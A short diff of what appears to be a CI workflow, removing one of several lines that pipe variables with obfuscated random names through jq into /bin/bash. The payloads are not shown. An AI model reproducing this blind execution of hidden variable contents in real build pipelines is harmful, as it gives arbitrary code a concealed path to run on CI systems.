@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$ggebv96395" | jq -r .sfbly872 | /bin/bash
           printf '%s' "$s887" | jq -r .bnz18516 | /bin/bash
           printf '%s' "$riz17" | jq -r .d3168 | /bin/bash
-          echo $llqt4372 | jq -r .qi18016 | /bin/bash
           echo $n1 | jq -r .pe52 | /bin/bash
           echo $nsue4121 | jq -r .leg5 | /bin/bash
           echo $i39 | jq -r .hsr6 | /bin/bash
